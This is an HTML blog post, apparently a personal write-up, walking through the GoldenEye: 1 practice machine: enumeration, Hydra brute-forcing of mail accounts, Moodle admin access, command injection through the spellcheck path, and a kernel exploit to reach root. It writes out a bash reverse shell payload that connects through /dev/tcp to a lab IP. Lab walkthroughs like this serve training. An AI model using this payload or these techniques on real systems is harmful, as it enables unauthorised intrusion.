@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/utils.css">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/blogpost.css">
+    <title>Hi, I'm Notnue</title>
+    
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-98YN0J0PW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-98YN0J0PW4');
+</script>
+    
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-N7HPXW3');</script>
+
+
+</head>
+<body>
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N7HPXW3"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+
+    <nav class="navigation max-width-1 m-auto">
+        <div class="nav-left">
+            <br><br>
+            <h1 class="font1">GOLDENEYE: 1 Kernal Exploit [Without Metasploit] </h1>
+            
+
+    </nav>
+    <div class="max-width-1 m-auto">
+        <hr>
+    </div>
+    <div class="post-img"><br><br>
+        <img src="img/goldeneye-hack6.png" alt="">
+    </div>
+    <div class="m-auto blog-post-content max-width-2 m-auto my-2">
+        
+        <br>
+         <p class="font1">They say this is the OSCP type practice vulnerable machine.The intermediate level machine.
+
+            Well, any good penetration tests begins at the beginning!, we’re with scanning and enumeration!!!!
+            
+            Hoping to the scans result we got:-<img src="img/goldeneye-nmap.png" alt="article"></p> <br>
+        <p class="font1">Hmm, port 55006, 55007 behaves weird, so we ran with deep scan on these ports and the results we got are:-</p>
+            <img src="img/goldeneye-inv.png" alt="article"><br>
+
+         <p class="font1">So we have pop3 service running, that’s good, we’ll look into this, but first let’s dive to web page running.</p>
+            <img src="img/goldeneye-pop3.png" alt="article">
+        
+         <p class="font1">OOO…. the TOP SECRET…. Awesome!!,, after reviewing source code manually, We got some of the users and encoded string, it’s a password of boris!!. After intercepting the request using burp, the string was html encoded, after the decode you’ll get the password of boris that allows us to view the page /sev-home/.</p>
+            <img src="img/goldeneye-topsecret.png" alt="article">
+    
+         <p class="font1">Since we saw the pop3 service was running, so let’s enumerate that, I tried to</p>
+            <img src="img/goldeneye-netcat.png" alt="article">
+         <p class="font1">use the same password but it was Authentication failure. So i tried brute forcing the creds of boris and YES!!! we got the creds</p>
+            <img src="img/goldeneye-hydra.png" alt="article"> 
+            <p class="font1">Enumerating all the mails and got the 3rd mail quite interesting!!!</p>
+                <img src="img/goldeneye-mails.png" alt="article">
+            <p class="font1">Okay, so Xenia is the another user, we’ll see into this, let’s try to gain access with Natalya also, with the same process, I brute forced the credentials for Natalya and logged in successfully, after reading the mails of her, one of the mail got the eyes!!!</p>
+                <img src="img/goldeneye-xenia.png" alt="article"> 
+            <p class="font1">So after redirecting to the given directory, there’s a moodle LMS !!!, since we have Xenia credentials. After successful login and enumerating all her account, there’s mail about dr_doak, Again brute forced the credentials of dr_doak using hydra, and we’re in!!!. Now go back to moodle application and log in with dr_doak credentials, AANNNDDD we found a s3cret.txt file…. hmm..</p>
+                <img src="img/goldeneye-hack.png" alt="article">
+            <p class="font1">Okay the text was written by 007, cool!!!!, from that text we got some interesting intel and after following what’s inside the text, there’s image.YES!!!, you are right, there must be some data inside that image, so after extracting the information we got something like This</p>
+                <img src="img/goldeneye-hack2.png" alt="article">
+            
+            <p class="font1">As per James (007), these are credentials of admin, so let’s try to fire these to moodle portal, and AWESOME!!! we’re in!!!. After enumeration we got moodle version info, so i googled and found about its weaknesses, , so after code review of the exploit it says:-<i>
+
+                Moodle allows an authenticated user to define spellcheck settings via the web interface.The user can update the spellcheck mechanism to point to a system-installed aspell binary.By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application upon spellchecking requests.
+                
+                This module also allows an attacker to leverage another privilege escalation vuln.Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey and use this to escalate privileges to that of an admin, allowing the module to pop a shell as a previously unprivileged authenticated user.</i>
+            </p>
+            <p class="font1">That’s AWESOME!!!!, if we can manipulate the command used by spellcheck and can successfully able to deploy the reverse shell and can gain access, sounds cool!!!, let’s do this!!!
+                <img src="img/goldeneye-hack3.png" alt="article">
+            </p>
+            <img src="img/goldeneye-hack3.png" alt="article">
+            </p>
+            <p class="font1">The payload I used :-
+
+                /bin/bash -c ‘/bin/bash>/dev/tcp/192.168.230.129/4444 0>&1 2>&1 &’ and then i move towards the system settings so that i can change the spell check engine to PSpellShell because google spell check was not allowing us to do so.
+                <img src="img/goldeneye-hack4.png" alt="article">
+            </p>
+        <p class="font1">And then, i entered the random text and clicked for the spell check so that I can get the reverse shell onto my terminal.
+            <img src="img/goldeneye-hack5.png" alt="article">
+        </p>
+        <p class="font1">And YES!!!! we gained the access!
+            <img src="img/goldeneye-hack6.png" alt="article">
+        </p>
+        <p class="font1"><b>PRIVILEGE ESCALATIONS</b>Here I used privy.sh for enumerating this whole machine and found not quiet interesting stuffs, so i went for the Kernal Exploit. As you can see, the shell was not with gcc installed, so i went with cc compiler. At first the code was unable to execute even with using cc compiler that’s because the exploit was by default using gcc compiler, so i edited the exploit and replaced gcc with cc.
+            <img src="img/goldeneye-hack7.png" alt="article">
+        </p>
+        <p class="font1">So i executed the exploit and you can see WE are ROOT!!!!!!
+            <img src="img/goldeneye-hack8.png" alt="article"></p>
+            <p class="font1"> That great sense of feeling when you finally get the flag, as shown:-
+                <img src="img/goldeneye-hack9.png" alt="article"></p>
+        <p class="font1">That’s all for now!!! If you find any difficulty, feel free to ping me.
+
+            Linkedin:- https://www.linkedin.com/in/user-neeleshpatel/
+            
+            Until Next Time,
+            
+            And Hey, we’re friends now!!</p>
+    </div>
+
+    <div class="max-width-1 m-auto"><hr></div>
+    <div class="home-articles max-width-1 m-auto font2">
+        <h2>People who read this also read</h2>
+        <div class="row">
+
+       
+        <div class="home-article more-post">
+            <div class="home-article-img">
+                <img src="img/rbashhh.png" alt="article">
+            </div>
+            <div class="home-article-content font1 center">
+                <a href="/rbbash.html"><h3>Breaking out of a Restricted shell Why do I even care? You have to!! My end ...</h3></a>
+                
+                
+            </div>
+        </div>
+        <div class="home-article more-post">
+            <div class="home-article-img">
+                <img src="img/linuxprev.png" alt="article">
+            </div>
+            <div class="home-article-content font1 center">
+                <a href="/linuxprev.html"><h3>This VM Image is beginner friendly machine. The object of the game is to acq..</h3></a>
+                
+                
+            </div>
+        </div>
+        <div class="home-article more-post">
+            <div class="home-article-img">
+                <img src="img/1111pm.png" alt="article">
+            </div>
+            <div class="home-article-content font1 center">
+                <a href="/headless.html"><h3>This VM Image is beginner friendly machine. The object of the game is to acq..</h3></a>
+                
+                
+            </div>
+        </div>
+        
+    </div>
+    </div>
+
+    
+</body>
+</html>
